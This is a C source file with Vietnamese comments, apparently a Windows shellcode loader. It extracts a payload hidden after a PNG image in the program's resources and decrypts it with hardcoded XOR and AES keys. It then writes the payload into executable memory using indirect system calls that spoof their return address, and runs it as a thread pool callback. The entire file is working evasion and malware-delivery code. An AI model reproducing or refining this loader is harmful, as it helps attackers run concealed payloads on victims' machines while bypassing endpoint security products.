#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "headstructs.h"
#include "aes.h"
#include "aes.c"
#include "resource.h"

// Định nghĩa cho resource
#define ORIGINAL_FILE_SIZE 228111
#define PAYLOAD_RESOURCE_ID IDB_PNG1
#define PAYLOAD_RESOURCE_TYPE L"PNG"

// Hàm trích xuất shellcode từ .rsrc
BOOL extract_shellcode(unsigned char** pPayload, size_t* pPayload_size, long int original_size) {
    printf("Fetching shellcode from .rsrc\n");
    HRSRC hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(PAYLOAD_RESOURCE_ID), PAYLOAD_RESOURCE_TYPE);
    if (!hRsrc) {
        printf("FindResourceW failed: %d\n", GetLastError());
        return FALSE;
    }
    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
    if (!hGlobal) {
        printf("LoadResource failed: %d\n", GetLastError());
        return FALSE;
    }
    LPVOID pResourceData = LockResource(hGlobal);
    if (!pResourceData) {
        printf("LockResource failed: %d\n", GetLastError());
        return FALSE;
    }
    SIZE_T sSize = SizeofResource(NULL, hRsrc);
    if (sSize <= original_size) {
        printf("No shellcode data found after the original file\n");
        return FALSE;
    }
    long int payload_size = sSize - original_size;
    unsigned char* Payload = (unsigned char*)malloc(payload_size);
    if (!Payload) {
        printf("Failed to allocate memory for shellcode\n");
        return FALSE;
    }
    memcpy(Payload, (unsigned char*)pResourceData + original_size, payload_size);
    *pPayload = Payload;
    *pPayload_size = payload_size;
    return TRUE;
}

// Hàm giải mã XOR
void xorDecrypt(PBYTE payload, size_t payload_len, PBYTE key, size_t key_len) {
    for (size_t i = 0; i < payload_len; ++i) {
        payload[i] ^= key[i % key_len];
    }
}

// Hàm sao chép bộ nhớ
PVOID CopyMemoryEx(PVOID Destination, PVOID Source, SIZE_T Length) {
    PBYTE D = (PBYTE)Destination;
    PBYTE S = (PBYTE)Source;
    while (Length--) *D++ = *S++;
    return Destination;
}

int main() {
    // Khóa XOR tĩnh
    unsigned char key[] = { 'm','y','s','e','c','r','e','t','x','o','r','k','e','y' };
    // Khóa AES và IV
    unsigned char aeskey[] = "\xc4\x5b\x16\x54\x77\xe8\xbf\xa9\xca\x3a\x1c\xd3\xca\x02\xaf\x9a\x2e\xe9\x0a\x9e\x2b\x18\x3f\xf3\x90\xfe\x97\x0f\x0e\x4d\x87\xe6";
    unsigned char aesiv[] = "\x2a\xb7\x16\xd3\x3b\x99\x74\xf1\x7d\x3d\x7e\x2b\x07\x37\x0e\x43";

    // Trích xuất shellcode từ .rsrc
    unsigned char* shellcode = NULL;
    size_t shellcodeSize = 0;
    if (!extract_shellcode(&shellcode, &shellcodeSize, ORIGINAL_FILE_SIZE)) {
        printf("Failed to extract shellcode\n");
        return 1;
    }

    // Giải mã XOR
    printf("XOR decrypting...\n");
    xorDecrypt(shellcode, shellcodeSize, key, sizeof(key));

    // Giải mã AES-CBC
    printf("AES decrypting...\n");
    if (shellcodeSize % 16 != 0) {
        printf("Shellcode size must be a multiple of 16 bytes (AES block size)\n");
        free(shellcode);
        return 1;
    }
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aeskey, aesiv);
    AES_CBC_decrypt_buffer(&ctx, shellcode, shellcodeSize);

    // Khởi tạo ntdll và system call
    auto hNtdll = GetModuleHandleA("ntdll.dll");
    DWORD SyscallId = 0;
    LPVOID spoofJump = ((char*)GetProcAddress(hNtdll, "NtAddBootEntry")) + 18;
    HANDLE c = CreateEventA(NULL, FALSE, TRUE, NULL);

    // Cấp phát bộ nhớ
    LPVOID currentVmBase = NULL;
    SIZE_T szWmResv = shellcodeSize;
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"ZwAllocateVirtualMemory");
    setup(SyscallId, spoofJump);
    NTSTATUS status = executioner((HANDLE)-1, &currentVmBase, NULL, &szWmResv, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (status != 0 || currentVmBase == NULL) {
        printf("Failed to allocate memory: 0x%08x\n", status);
        free(shellcode);
        return 1;
    }

    // Sao chép shellcode đã giải mã
    CopyMemoryEx(currentVmBase, shellcode, szWmResv);
    free(shellcode);

    // Thay đổi quyền bộ nhớ
    DWORD oldProt;
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtProtectVirtualMemory");
    setup(SyscallId, spoofJump);
    status = executioner((HANDLE)-1, &currentVmBase, &szWmResv, PAGE_EXECUTE_READ, &oldProt);

    if (status != 0) {
        printf("Failed to protect memory: 0x%08x\n", status);
        VirtualFree(currentVmBase, 0, MEM_RELEASE);
        return 1;
    }

    // Tạo Thread Pool Wait
    HANDLE hThread = NULL;
    pTpAllocWait TpAllocWait = (pTpAllocWait)GetProcAddress(hNtdll, "TpAllocWait");
    status = TpAllocWait((TP_WAIT**)&hThread, (PTP_WAIT_CALLBACK)currentVmBase, NULL, NULL);

    if (status != 0 || hThread == NULL) {
        printf("Failed to create thread pool wait: 0x%08x\n", status);
        VirtualFree(currentVmBase, 0, MEM_RELEASE);
        return 1;
    }

    // Kích hoạt Thread Pool Wait
    pTpSetWait TpSetWait = (pTpSetWait)GetProcAddress(hNtdll, "TpSetWait");
    TpSetWait((TP_WAIT*)hThread, c, NULL);

    // Chờ hoàn tất
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtWaitForSingleObject");
    setup(SyscallId, spoofJump);
    status = executioner(c, 0, NULL);

    // Dọn dẹp
    CloseHandle(hThread);
    VirtualFree(currentVmBase, 0, MEM_RELEASE);

    return 0;
}